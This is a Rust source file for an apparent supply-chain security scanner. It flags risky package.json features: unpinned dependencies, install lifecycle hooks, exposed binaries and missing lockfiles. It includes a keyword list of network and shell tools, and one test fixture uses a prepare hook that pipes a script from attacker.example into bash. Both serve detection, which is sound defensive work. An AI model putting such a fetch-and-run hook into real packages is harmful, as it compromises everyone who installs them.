//! `package.json` manifest detector: unpinned-dep findings, install
//! lifecycle hooks (with risky-shell escalation), exposed `bin` field,
//! and missing-lockfile reporting based on `packageManager`.

use serde_json::Value;
use std::path::{Path, PathBuf};

use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};

use super::NPM_INSTALL_HOOKS;

pub(crate) fn analyze_package_json(
    service: &ArtifactOrchestratorService,
    path: &Path,
    content: &str,
    sibling_files: &[PathBuf],
) -> Vec<Finding> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };

    let mut findings = Vec::new();
    let artifact_path = path.display().to_string();

    // Suppress unpinned dep findings when a lockfile exists, since the
    // lockfile pins exact versions regardless of the version specifier.
    let has_lockfile = package_json_expected_lockfiles(content)
        .iter()
        .any(|lockfile| {
            crate::services::artifact_orchestration::manifests::sibling_has_file(
                sibling_files,
                lockfile,
            )
        });

    for dependency_field in ["dependencies", "devDependencies", "optionalDependencies"] {
        let Some(dependencies) = json.get(dependency_field).and_then(Value::as_object) else {
            continue;
        };

        for (name, version) in dependencies {
            let Some(version_str) = version.as_str() else {
                continue;
            };

            if !has_lockfile
                && (version_str.starts_with('^')
                    || version_str.starts_with('~')
                    || version_str == "latest"
                    || version_str == "*")
            {
                findings.push(
                    Finding::builder(
                        "MANIFEST_PACKAGE_JSON_UNPINNED_DEP",
                        ThreatCategory::SupplyChain,
                    )
                    .severity(Severity::Low)
                    .action(RecommendedAction::Log)
                    .evidence_kind(EvidenceKind::Context)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(format!("{name}@{version_str}"))
                    .reason("Manifest dependency is not strictly pinned")
                    .build(),
                );
            }
        }
    }

    if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
        for hook in NPM_INSTALL_HOOKS {
            if let Some(command) = scripts.get(*hook).and_then(Value::as_str) {
                let lower_command = command.to_ascii_lowercase();
                let risky_install_hook = [
                    "curl ",
                    "wget ",
                    "http://",
                    "https://",
                    "powershell",
                    "invoke-webrequest",
                    "iwr ",
                    "bash -c",
                    "sh -c",
                    "python -c",
                    "node -e",
                ]
                .iter()
                .any(|needle| lower_command.contains(needle));
                findings.push(
                    Finding::builder(
                        "MANIFEST_PACKAGE_JSON_INSTALL_HOOK",
                        ThreatCategory::SupplyChain,
                    )
                    .severity(if risky_install_hook {
                        Severity::Medium
                    } else {
                        Severity::Low
                    })
                    .action(if risky_install_hook {
                        RecommendedAction::RequireApproval
                    } else {
                        RecommendedAction::Log
                    })
                    .evidence_kind(if risky_install_hook {
                        EvidenceKind::Behavior
                    } else {
                        EvidenceKind::Context
                    })
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(format!("{hook}: {command}"))
                    .reason(if risky_install_hook {
                        "Manifest defines an install lifecycle hook that fetches or executes code"
                    } else {
                        "Manifest defines an install lifecycle hook"
                    })
                    .build(),
                );
            }
        }
    }

    if package_json_bin_is_exposed(&json) {
        findings.push(
            Finding::builder(
                "MANIFEST_PACKAGE_JSON_BIN_EXPOSED",
                ThreatCategory::ScopeCreep,
            )
            .severity(Severity::Low)
            .action(RecommendedAction::Log)
            .evidence_kind(EvidenceKind::Context)
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.clone(),
            })
            .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
            .match_value("bin")
            .reason("Manifest exposes executable binaries")
            .build(),
        );
    }

    let expected_lockfiles = package_json_expected_lockfiles(content);
    if !expected_lockfiles.is_empty() {
        findings.extend(service.missing_lockfile_findings(
            path,
            sibling_files,
            &expected_lockfiles,
            "MANIFEST_PACKAGE_JSON_MISSING_LOCKFILE",
            "JavaScript manifest has no matching nearby lockfile",
        ));
    }

    findings
}

pub(crate) fn package_json_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };

    let mut capabilities = Vec::new();

    if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
        if NPM_INSTALL_HOOKS
            .iter()
            .any(|hook| scripts.contains_key(*hook))
        {
            capabilities.push(ArtifactOrchestratorService::declared_capability(
                ArtifactCapability::InstallExecution,
            ));
            capabilities.push(ArtifactOrchestratorService::declared_capability(
                ArtifactCapability::ProcessExecution,
            ));
        }
    }

    if package_json_bin_is_exposed(&json) {
        capabilities.push(ArtifactOrchestratorService::declared_capability(
            ArtifactCapability::ExposesBinary,
        ));
    }

    capabilities
}

/// Whether `package.json`'s `bin` field exposes at least one executable.
///
/// npm only honors `bin` as a non-empty string (single binary named after the
/// package) or a non-empty object (`{name -> path}` map). `null`, `""`, `{}`,
/// `[]`, or any other shape is a no-op for npm and must NOT contribute the
/// `ExposesBinary` capability or fire `MANIFEST_PACKAGE_JSON_BIN_EXPOSED` —
/// otherwise an empty placeholder field falsely escalates the package via the
/// `install_binary` capability combo (`findings/summary.rs:345`).
fn package_json_bin_is_exposed(json: &Value) -> bool {
    match json.get("bin") {
        // Whitespace-only strings are normalised away by npm at install
        // time, so they expose nothing — pre-fix `!s.is_empty()` treated
        // `"   "` as a real binary and falsely escalated the package.
        Some(Value::String(s)) => !s.trim().is_empty(),
        Some(Value::Object(map)) => !map.is_empty(),
        _ => false,
    }
}

pub(crate) fn package_json_expected_lockfiles(content: &str) -> Vec<&'static str> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };

    let package_manager = json
        .get("packageManager")
        .and_then(Value::as_str)
        .unwrap_or_default()
        .to_ascii_lowercase();

    if package_manager.starts_with("pnpm@") {
        return vec!["pnpm-lock.yaml"];
    }
    if package_manager.starts_with("yarn@") {
        return vec!["yarn.lock"];
    }
    if package_manager.starts_with("npm@") {
        return vec!["package-lock.json", "npm-shrinkwrap.json"];
    }

    vec![
        "package-lock.json",
        "npm-shrinkwrap.json",
        "yarn.lock",
        "pnpm-lock.yaml",
    ]
}

pub(crate) fn package_json_relations(content: &str) -> Vec<ArtifactLink> {
    let Ok(json) = serde_json::from_str::<Value>(content) else {
        return Vec::new();
    };
    let mut links = Vec::new();
    if let Some(scripts) = json.get("scripts").and_then(Value::as_object) {
        for hook in NPM_INSTALL_HOOKS {
            if let Some(command) = scripts.get(*hook).and_then(Value::as_str) {
                links.push(ArtifactLink {
                    target: command.to_string(),
                    relation: ArtifactRelation::Executes,
                });
            }
        }
    }
    links
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    fn finding_present(findings: &[Finding], rule_id: &str) -> bool {
        findings.iter().any(|finding| finding.rule_id == rule_id)
    }

    /// Contract: `bin: null` carries no executable; capability and finding must NOT fire.
    #[test]
    fn package_json_bin_capability_skips_null_value() {
        let manifest = r#"{"name":"pkg","bin":null}"#;
        let caps = package_json_capabilities(manifest);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ExposesBinary
        ));
    }

    /// Contract: `bin: ""` carries no executable path; capability and finding must NOT fire.
    #[test]
    fn package_json_bin_capability_skips_empty_string() {
        let manifest = r#"{"name":"pkg","bin":""}"#;
        let caps = package_json_capabilities(manifest);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ExposesBinary
        ));
    }

    /// Contract: `bin: {}` declares no binaries; capability and finding must NOT fire.
    #[test]
    fn package_json_bin_capability_skips_empty_object() {
        let manifest = r#"{"name":"pkg","bin":{}}"#;
        let caps = package_json_capabilities(manifest);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::ExposesBinary
        ));
    }

    /// Contract: a non-empty string `bin` exposes one executable named after the package;
    /// capability and finding must fire (positive case to pin the happy path).
    #[test]
    fn package_json_bin_capability_fires_for_string_path() {
        let manifest = r#"{"name":"pkg","bin":"./cli.js"}"#;
        let caps = package_json_capabilities(manifest);
        assert!(capability_present(&caps, ArtifactCapability::ExposesBinary));
    }

    /// Contract: a non-empty object `bin` exposes one or more named executables;
    /// capability and finding must fire.
    #[test]
    fn package_json_bin_capability_fires_for_non_empty_object() {
        let manifest = r#"{"name":"pkg","bin":{"foo":"./foo.js"}}"#;
        let caps = package_json_capabilities(manifest);
        assert!(capability_present(&caps, ArtifactCapability::ExposesBinary));
    }

    /// Contract: the BIN_EXPOSED finding mirrors the capability — empty values
    /// are skipped, non-empty values fire.
    #[test]
    fn package_json_bin_finding_skips_empty_object_and_fires_for_real_value() {
        let empty = r#"{"name":"pkg","bin":{}}"#;
        let real = r#"{"name":"pkg","bin":"./cli.js"}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let empty_findings = analyze_package_json(&service, path, empty, &[]);
        let real_findings = analyze_package_json(&service, path, real, &[]);
        assert!(!finding_present(
            &empty_findings,
            "MANIFEST_PACKAGE_JSON_BIN_EXPOSED"
        ));
        assert!(finding_present(
            &real_findings,
            "MANIFEST_PACKAGE_JSON_BIN_EXPOSED"
        ));
    }

    /// Contract: `analyze_package_json` flags a `prepare` install hook
    /// as risky when its command runs `curl ... | bash`. `prepare`
    /// runs on `npm install` (no args, dev mode) and before
    /// `npm publish` / `npm pack`, so it ships arbitrary code with the
    /// same automatic-execution semantics as `preinstall`/`postinstall`.
    /// The pre-fix loop covered only the three classic hooks.
    #[test]
    fn analyze_package_json_detects_prepare_hook_with_curl() {
        let manifest =
            r#"{"name":"x","scripts":{"prepare":"curl http://attacker.example/p.sh | bash"}}"#;
        let path = std::path::Path::new("/pkg/package.json");
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_package_json(&service, path, manifest, &[]);
        let install_hook_finding = findings
            .iter()
            .find(|f| f.rule_id == "MANIFEST_PACKAGE_JSON_INSTALL_HOOK")
            .expect("prepare hook with curl must raise an install-hook finding");
        assert_eq!(install_hook_finding.severity, Severity::Medium);
        assert_eq!(
            install_hook_finding.recommended_action,
            RecommendedAction::RequireApproval,
        );
        assert!(install_hook_finding.match_value.starts_with("prepare:"));
    }

    /// Contract: `package_json_capabilities` flips `InstallExecution`
    /// and `ProcessExecution` for any of the auto-running hooks,
    /// including `prepare` / `prepublishOnly` / `postpublish`.
    #[test]
    fn package_json_capabilities_fires_for_prepare_and_prepublish_hooks() {
        for hook in ["prepare", "prepublishOnly", "postpublish"] {
            let manifest = format!(r#"{{"name":"x","scripts":{{"{hook}":"echo hi"}}}}"#);
            let caps = package_json_capabilities(&manifest);
            assert!(
                capability_present(&caps, ArtifactCapability::InstallExecution),
                "hook `{hook}` must declare InstallExecution",
            );
            assert!(
                capability_present(&caps, ArtifactCapability::ProcessExecution),
                "hook `{hook}` must declare ProcessExecution",
            );
        }
    }

    /// Contract: a `bin` field that is whitespace-only is a no-op for npm
    /// (npm normalises it away), so it MUST NOT contribute the
    /// `ExposesBinary` capability. Pre-fix `!s.is_empty()` accepted `"   "`
    /// as a real binary and falsely escalated the package via the
    /// `install_binary` capability combo.
    #[test]
    fn package_json_capabilities_rejects_whitespace_only_bin() {
        for bin_value in ["\"   \"", "\"\\t\"", "\"\\n\""] {
            let manifest = format!(r#"{{"name":"x","bin":{bin_value}}}"#);
            let caps = package_json_capabilities(&manifest);
            assert!(
                !capability_present(&caps, ArtifactCapability::ExposesBinary),
                "bin={bin_value} (whitespace-only) must not expose binary; got {caps:?}",
            );
        }
    }

    /// Contract: a real `bin` path MUST still flip `ExposesBinary`.
    /// Positive-case regression guard so the trim fix doesn't accidentally
    /// suppress legitimate bin declarations.
    #[test]
    fn package_json_capabilities_accepts_real_bin_path() {
        let manifest = r#"{"name":"x","bin":"./cli.js"}"#;
        let caps = package_json_capabilities(manifest);
        assert!(
            capability_present(&caps, ArtifactCapability::ExposesBinary),
            "real bin path must expose binary; got {caps:?}",
        );
    }
}
